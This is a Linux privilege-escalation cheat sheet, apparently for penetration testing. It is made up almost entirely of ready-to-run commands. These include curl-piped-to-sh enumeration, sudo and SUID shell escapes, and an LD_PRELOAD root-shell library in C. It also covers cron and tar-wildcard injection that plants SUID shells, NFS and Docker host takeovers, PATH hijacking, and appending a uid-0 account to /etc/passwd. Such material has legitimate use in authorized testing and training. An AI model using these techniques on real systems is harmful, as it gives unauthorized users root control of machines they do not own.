# Linux Privilege Escalation

## Enumeration

```bash
id                                      # current user/groups
uname -a                               # kernel version
cat /etc/os-release                    # OS version
sudo -l                                 # sudo permissions
find / -perm -4000 2>/dev/null          # SUID binaries
find / -perm -2000 2>/dev/null          # SGID binaries
getcap -r / 2>/dev/null                 # capabilities
cat /etc/crontab                        # cron jobs
ls -la /etc/cron*                       # cron directories
ps aux                                  # running processes
netstat -tlnp                           # listening ports
env                                     # environment variables
cat /etc/passwd                         # user list
cat /etc/shadow 2>/dev/null             # password hashes (if readable)
find / -writable -type f 2>/dev/null    # world-writable files
```

### Automated Enumeration

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh
```

## sudo Exploits

### Specific Command Allowed

```bash
# Check GTFOBins (gtfobins.github.io) for the allowed command
# Common exploitable sudo commands:

sudo vi -c ':!/bin/sh'
sudo less /etc/passwd  # then: !/bin/sh
sudo man man           # then: !/bin/sh
sudo awk 'BEGIN{system("/bin/sh")}'
sudo find / -exec /bin/sh \;
sudo nmap --interactive  # then: !sh (old nmap)
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo env /bin/sh
sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### LD_PRELOAD

```bash
# If sudo allows LD_PRELOAD (visible in sudo -l):
# env_keep+=LD_PRELOAD

cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    system("/bin/sh");
}
EOF
gcc -shared -fPIC -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

## SUID Binary Exploits

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check each against GTFOBins
# Common exploitable SUID binaries:
/usr/bin/python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
/usr/bin/find / -exec /bin/sh -p \;
/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh","sh","-p")'
```

## Capabilities

```bash
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid → set UID to 0
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_read_search → read any file
tar cf - /etc/shadow | tar xf -

# cap_net_bind_service → bind to privileged ports
# Useful for MITM but not direct privesc
```

## Cron Job Exploitation

```bash
# Check for writable cron scripts
cat /etc/crontab
ls -la /etc/cron.d/
# If a cron job runs a script you can modify:
echo 'cp /bin/sh /tmp/sh && chmod +s /tmp/sh' >> /path/to/cron/script
# Wait for cron to execute, then: /tmp/sh -p
```

### Wildcard Exploitation

```bash
# If cron runs: tar cf /backup/backup.tar *
# In the directory with wildcard:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo 'cp /bin/sh /tmp/sh; chmod +s /tmp/sh' > privesc.sh
```

## Kernel Exploits

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel <version> privilege escalation

# Common historical exploits:
# DirtyCOW (CVE-2016-5195) — kernel < 4.8.3
# DirtyPipe (CVE-2022-0847) — kernel 5.8-5.16.11
# GameOver(lay) (CVE-2023-2640) — Ubuntu OverlayFS
```

## NFS Root Squashing

```bash
# If NFS share has no_root_squash:
showmount -e <target>
mount -o rw <target>:/share /mnt
# Create SUID binary on share as root
cp /bin/sh /mnt/sh
chmod +s /mnt/sh
# Execute on target: /share/sh -p
```

## Docker Privesc

```bash
# If user is in docker group:
docker run -v /:/host -it ubuntu /bin/sh
# Now access host filesystem at /host

# Docker socket available:
docker run -v /:/host --privileged -it alpine /bin/sh
```

## PATH Hijacking

```bash
# If a SUID/sudo program calls a command without absolute path:
# Create a malicious version in a directory you control
echo '/bin/sh' > /tmp/ls
chmod +x /tmp/ls
PATH=/tmp:$PATH /path/to/vulnerable/suid/binary
```

## Writable /etc/passwd

```bash
# If /etc/passwd is writable:
# Generate password hash
openssl passwd -1 hacked
# Add root-level user
echo 'hacker:$1$...:0:0::/root:/bin/sh' >> /etc/passwd
su hacker
```
